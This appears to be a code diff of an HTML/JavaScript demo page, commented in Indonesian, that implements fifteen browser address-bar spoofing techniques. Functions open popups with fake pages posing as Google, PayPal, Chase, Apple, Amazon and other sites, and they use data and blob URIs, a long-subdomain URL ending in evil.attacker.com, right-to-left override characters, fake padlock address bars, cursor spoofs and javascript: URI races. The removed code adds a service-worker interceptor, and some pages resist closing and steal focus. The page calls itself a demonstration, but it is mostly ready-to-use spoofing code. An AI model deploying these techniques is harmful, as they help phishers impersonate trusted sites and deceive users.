+        <div style="margin-top: 10px; font-size: 0.7em;">
+            🔬 Total Exploit Methods: 15 | Berdasarkan Real-World Vulnerabilities
+        </div>
+    </div>
+</div>
+
+<script>
+    // Helper: Fake page generator untuk setiap exploit
+    function generateFakePage(spoofedURL, techniqueName, extraHTML = '') {
+        return `<!DOCTYPE html>
+        <html>
+        <head>
+            <title>${spoofedURL}</title>
+            <style>
+                body {
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    color: white;
+                    text-align: center;
+                    padding: 50px 20px;
+                    margin: 0;
+                    min-height: 100vh;
                 }
-            };
+                .demo-card {
+                    background: rgba(0,0,0,0.85);
+                    border-radius: 20px;
+                    padding: 40px;
+                    max-width: 600px;
+                    margin: 50px auto;
+                    backdrop-filter: blur(10px);
+                    border: 1px solid rgba(255,255,255,0.2);
+                }
+                h1 { color: #ff3366; margin-bottom: 20px; }
+                .spoofed-url {
+                    background: #1a1f3a;
+                    padding: 15px;
+                    border-radius: 10px;
+                    font-family: monospace;
+                    font-size: 1.2em;
+                    word-break: break-all;
+                    margin: 20px 0;
+                    border-left: 3px solid #00ff9d;
+                }
+                .technique-info {
+                    background: rgba(0,255,157,0.1);
+                    padding: 15px;
+                    border-radius: 10px;
+                    font-size: 0.9em;
+                    margin: 20px 0;
+                }
+                button {
+                    background: #ff3366;
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    border-radius: 25px;
+                    cursor: pointer;
+                    font-size: 1em;
+                    transition: 0.2s;
+                }
+                button:hover { background: #ff6699; transform: scale(1.05); }
+                .warning { color: #ffaa00; font-size: 0.8em; margin-top: 20px; }
+            </style>
+            ${extraHTML}
+        </head>
+        <body>
+            <div class="demo-card">
+                <h1>⚠️ ADDRESS BAR SPOOFED</h1>
+                <p>Browser menunjukkan:</p>
+                <div class="spoofed-url">${spoofedURL}</div>
+                <div class="technique-info">
+                    <strong>🔬 Teknik: ${techniqueName}</strong><br>
+                    Anda pikir Anda di ${spoofedURL}, namun sebenarnya di malicious page.
+                </div>
+                <button onclick="window.close()">Tutup Window</button>
+                <div class="warning">⚠️ DEMONSTRASI - Address bar telah dimanipulasi</div>
+            </div>
+            <script>
+                // Prevent easy closing
+                window.onbeforeunload = function() { return 'Are you sure?'; };
+                // Anti-focus steal
+                setInterval(() => { window.focus(); }, 500);
+            <\/script>
+        </body>
+        </html>`;
+    }
 
-            // METHOD 9: Meta Refresh Timing Attack
-            window.method9_metaRefresh = function() {
-                window.currentTechnique = "Meta Refresh Timing Attack";
-                var fakeWithMeta = `<!DOCTYPE html>
-                <html>
-                <head>
-                    <meta http-equiv="refresh" content="0; url=https://www.google.com:8443">
-                    <title>Google</title>
-                </head>
-                <body>
-                    ${getFakePage("https://www.google.com")}
-                    <script>
-                        setTimeout(() => {
-                            document.title = "Google Search";
-                        }, 100);
-                    <\/script>
-                </body>
-                </html>`;
-                
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.document.write(fakeWithMeta);
-            };
+    // EXPLOIT 1: URL Freeze Attack
+    window.exploitURLFreeze = function() {
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(generateFakePage('https://www.google.com', 'URL Freeze (CVE-2025-9183 Style)'));
+        // Attempt to freeze address bar
+        setTimeout(() => {
+            try {
+                win.location.replace('https://www.google.com:8081');
+            } catch(e) { console.log('Blocked by modern browser'); }
+        }, 50);
+        setInterval(() => {
+            try {
+                win.location.replace('https://www.google.com:8081');
+            } catch(e) {}
+        }, 500);
+    };
 
-            // METHOD 10: Blob URL Spoofing
-            window.method10_blob = function() {
-                window.currentTechnique = "Blob URL Spoofing";
-                var blob = new Blob([getFakePage("https://www.twitter.com")], {type: 'text/html'});
-                var blobURL = URL.createObjectURL(blob);
-                var win = window.open(blobURL, '_blank', 'width=800,height=600');
-                
-                setTimeout(() => {
-                    URL.revokeObjectURL(blobURL);
-                }, 1000);
-            };
+    // EXPLOIT 2: Data URI Spoofing
+    window.exploitDataURI = function() {
+        var fakeHTML = generateFakePage('https://www.paypal.com', 'Data URI Spoof (Arc/Opera GX)');
+        var dataURI = 'data:text/html,' + encodeURIComponent(fakeHTML);
+        window.open(dataURI, '_blank', 'width=900,height=700');
+    };
 
-            // METHOD 11: PostMessage Hijacking
-            window.method11_postMessage = function() {
-                window.currentTechnique = "PostMessage Hijacking";
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.document.write(getFakePage("https://www.instagram.com"));
-                
-                // Hijack postMessage
-                window.addEventListener('message', function(e) {
-                    if(e.origin === 'https://www.instagram.com') {
-                        win.postMessage({type: 'spoof', url: 'https://www.instagram.com'}, '*');
+    // EXPLOIT 3: Long Subdomain Truncation
+    window.exploitLongSubdomain = function() {
+        var longSubdomain = 'https://accounts.login.google.com.secure.verify.trusted.this.is.extremely.long.subdomain.that.will.be.truncated.by.browser.evil.attacker.com';
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(generateFakePage('https://accounts.login.google.com...', 'Long Subdomain Truncation (CVE-2026-44659)'));
+        try {
+            win.location = longSubdomain;
+        } catch(e) {}
+    };
+
+    // EXPLOIT 4: Blob URL Spoofing
+    window.exploitBlobSpoof = function() {
+        var fakeHTML = generateFakePage('https://www.apple.com', 'Blob URL Hash Spoof (Safari)');
+        var blob = new Blob([fakeHTML], {type: 'text/html'});
+        var blobURL = URL.createObjectURL(blob);
+        var win = window.open(blobURL, '_blank', 'width=900,height=700');
+        setTimeout(() => URL.revokeObjectURL(blobURL), 2000);
+    };
+
+    // EXPLOIT 5: Fullscreen Fake Address Bar
+    window.exploitFullscreen = function() {
+        var fakeHTML = generateFakePage('https://www.chase.com', 'Fullscreen UI Spoof', `
+            <style>
+                .fake-address-bar {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    background: #2c2c2e;
+                    padding: 12px 20px;
+                    z-index: 999999;
+                    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+                    display: flex;
+                    gap: 15px;
+                    border-bottom: 1px solid #444;
+                }
+                .fake-url {
+                    background: #1c1c1e;
+                    padding: 6px 15px;
+                    border-radius: 20px;
+                    color: #00ff9d;
+                    font-family: monospace;
+                    flex: 1;
+                }
+                .fake-lock { color: #00ff9d; }
+            </style>
+            <div class="fake-address-bar">
+                <span class="fake-lock">🔒 Secure</span>
+                <span class="fake-url">https://www.chase.com</span>
+                <span>⭐ ☆</span>
+            </div>
+            <div style="margin-top: 60px;"></div>
+        `);
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(fakeHTML);
+        // Request fullscreen
+        win.document.documentElement.requestFullscreen().catch(e => console.log('Fullscreen blocked'));
+    };
+
+    // EXPLOIT 6: RTL Bidirectional Spoofing
+    window.exploitRTL = function() {
+        var rtlHTML = generateFakePage('https://google.com/secure', 'RTL/LTR BiDi Spoof (CVE-2023-5732)');
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(rtlHTML);
+        // Try to set RTL URL
+        try {
+            win.location = 'https://moc.elgoog//\u202E}moc.ekirtsa/';
+        } catch(e) {}
+    };
+
+    // EXPLOIT 7: HTTP 204 No Content
+    window.exploitHTTP204 = function() {
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(generateFakePage('https://www.microsoft.com', 'HTTP 204 No Content (Arc Android)'));
+        // Simulate 204 redirect
+        setTimeout(() => {
+            try {
+                win.location.replace('https://www.microsoft.com/api/empty');
+            } catch(e) {}
+        }, 100);
+    };
+
+    // EXPLOIT 8: Oversized Cursor Spoof
+    window.exploitCursorSpoof = function() {
+        var cursorHTML = generateFakePage('https://www.icloud.com', 'Oversized Cursor Spoof (Safari 2025)', `
+            <style>
+                * {
+                    cursor: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="128" height="128"%3E%3Crect width="128" height="128" fill="%232c2c2e"/%3E%3Ctext x="10" y="30" fill="%2300ff9d" font-size="14" font-family="monospace"%3Ehttps://icloud.com%3C/text%3E%3C/svg%3E') 0 0, auto;
+                }
+                .content { height: 200vh; }
+            </style>
+            <div class="content" style="height: 200vh;"></div>
+        `);
+        window.open('', '_blank', 'width=900,height=700').document.write(cursorHTML);
+    };
+
+    // EXPLOIT 9: visibilitychange Android Attack
+    window.exploitVisibilityChange = function() {
+        var visHTML = generateFakePage('https://www.amazon.com', 'visibilitychange Attack (CVE-2025-11718)', `
+            <style>
+                .fake-bar {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    background: white;
+                    padding: 10px;
+                    z-index: 10000;
+                    display: none;
+                    border-bottom: 1px solid #ccc;
+                }
+            </style>
+            <div class="fake-bar">🔒 https://www.amazon.com</div>
+            <div style="height: 200vh; padding-top: 50px;">Scroll down to see effect...</div>
+            <script>
+                let hiddenCount = 0;
+                document.addEventListener('visibilitychange', () => {
+                    if (document.hidden) {
+                        hiddenCount++;
+                        if(hiddenCount > 2) {
+                            document.querySelector('.fake-bar').style.display = 'block';
+                        }
                     }
                 });
-                
-                win.postMessage({type: 'init'}, '*');
-            };
+                window.addEventListener('scroll', () => {
+                    if(window.scrollY > 100) {
+                        document.querySelector('.fake-bar').style.display = 'block';
+                    }
+                });
+            <\/script>
+        `);
+        window.open('', '_blank', 'width=450,height=800').document.write(visHTML);
+    };
 
-            // METHOD 12: Double Redirect Chain
-            window.method12_doubleRedirect = function() {
-                window.currentTechnique = "Double Redirect Chain";
-                var win = window.open('', '_blank', 'width=800,height=600');
-                
-                // First redirect
-                win.location = 'about:blank';
-                setTimeout(() => {
-                    win.document.write(getFakePage("https://www.linkedin.com"));
-                    // Second redirect after delay
-                    setTimeout(() => {
-                        try {
-                            win.location.replace('https://www.linkedin.com:8080');
-                        } catch(e) {}
-                    }, 1000);
-                }, 500);
-            };
+    // EXPLOIT 10: iframe Frame Spoofing
+    window.exploitIframeSpoof = function() {
+        var iframeHTML = `<!DOCTYPE html>
+        <html>
+        <head><title>Spoof Demo</title></head>
+        <frameset rows="50%,50%">
+            <frame src="data:text/html,${encodeURIComponent(generateFakePage('https://www.facebook.com', 'iframe Frame Spoof CVE-2017-7011'))}">
+            <frame src="about:blank">
+        </frameset>
+        </html>`;
+        window.open('', '_blank', 'width=900,height=700').document.write(iframeHTML);
+    };
 
-            // METHOD 13: Service Worker Interception
-            window.method13_serviceWorker = function() {
-                window.currentTechnique = "Service Worker Interception";
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.document.write(getFakePage("https://www.netflix.com"));
-                
-                // Register service worker if supported
-                if('serviceWorker' in win.navigator) {
-                    var swCode = `self.addEventListener('fetch', event => {
-                        event.respondWith(
-                            new Response('<html><body>Intercepted!</body></html>', {
-                                headers: {'Content-Type': 'text/html'}
-                            })
-                        );
-                    });`;
-                    
-                    var blob = new Blob([swCode], {type: 'application/javascript'});
-                    var swURL = URL.createObjectURL(blob);
-                    win.navigator.serviceWorker.register(swURL).then(() => {
-                        URL.revokeObjectURL(swURL);
-                    });
-                }
-            };
+    // EXPLOIT 11: Title Bar Spoofing
+    window.exploitTitleSpoof = function() {
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(generateFakePage('Aloha Browser Vulnerability', 'Title Bar Spoof (Aloha Browser)'));
+        win.document.title = 'https://www.paypal.com';
+    };
 
-            // METHOD 14: DOM Clobbering Attack
-            window.method14_domClobber = function() {
-                window.currentTechnique = "DOM Clobbering";
-                var clobberHTML = `<!DOCTYPE html>
-                <html>
-                <head><title>Document</title></head>
-                <body>
-                    <form name="location"></form>
-                    <form name="document"></form>
-                    ${getFakePage("https://www.github.com")}
-                    <script>
-                        // Clobber location object
-                        window.location.href = "https://www.github.com";
-                    <\/script>
-                </body>
-                </html>`;
-                
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.document.write(clobberHTML);
-            };
+    // EXPLOIT 12: Internal URI Abuse
+    window.exploitInternalURI = function() {
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(generateFakePage('https://www.google.com', 'Internal URI Abuse (Firefox iOS)'));
+        try {
+            win.location.href = 'internal://local/errorpage?url=https://www.google.com/.';
+        } catch(e) {}
+    };
 
-            // METHOD 15: XSS Fake Address Bar
-            window.method15_xssFake = function() {
-                window.currentTechnique = "XSS Fake Address Bar";
-                var fakeBarHTML = `<!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Google Chrome</title>
-                    <style>
-                        .fake-address-bar {
-                            position: fixed;
-                            top: 0;
-                            left: 0;
-                            right: 0;
-                            background: #f1f3f4;
-                            padding: 8px;
-                            font-family: monospace;
-                            z-index: 9999;
-                            border-bottom: 1px solid #ddd;
-                        }
-                        .fake-url {
-                            background: white;
-                            padding: 6px 12px;
-                            border-radius: 20px;
-                            margin: 0 10px;
-                            color: #202124;
-                        }
-                        .real-content {
-                            margin-top: 50px;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="fake-address-bar">
-                        <span>🔒 Secure | </span>
-                        <span class="fake-url">https://www.paypal.com/signin</span>
-                        <span> ⭐ ☆ 📌</span>
-                    </div>
-                    <div class="real-content">
-                        ${getFakePage("Fake Address Bar Demo")}
-                    </div>
-                    <script>
-                        // Disable actual address bar interactions
-                        window.addEventListener('beforeunload', function(e) {
-                            e.preventDefault();
-                            return false;
-                        });
-                    <\/script>
-                </body>
-                </html>`;
-                
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.document.write(fakeBarHTML);
-                win.document.title = "PayPal - Secure Payment";
-            };
-        </script>
-    </body>
+    // EXPLOIT 13: JS URI Race Condition
+    window.exploitJSRace = function() {
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(generateFakePage('https://www.netflix.com', 'JS URI Race (PS5 Browser)'));
+        try {
+            win.location.href = 'https://www.netflix.com';
+            setTimeout(() => {
+                try {
+                    win.location.href = 'javascript:document.body.innerHTML="<h1>Race Condition Success</h1>"';
+                } catch(e) {}
+            }, 10);
+        } catch(e) {}
+    };
+
+    // EXPLOIT 14: Search Engine Integration Abuse
+    window.exploitSearchSpoof = function() {
+        var fakeHTML = generateFakePage('Google Search', 'Search Query Spoof (Opera GX/Arc iOS)');
+        var dataURI = 'data:text/html,' + encodeURIComponent(fakeHTML);
+        window.open(dataURI, '_blank', 'width=900,height=700');
+    };
+
+    // EXPLOIT 15: Unicode Whitespace Truncation
+    window.exploitUnicodeWhitespace = function() {
+        var win = window.open('', '_blank', 'width=900,height=700');
+        win.document.write(generateFakePage('https://accounts.google.com', 'Unicode Whitespace Spoof'));
+        try {
+            var unicodeChar = String.fromCodePoint(0x08FC);
+            win.location = 'https://accounts.google.com' + unicodeChar + unicodeChar + unicodeChar + '.evil.com';
+        } catch(e) {}
+    };
+</script>
+</body>
 </html>
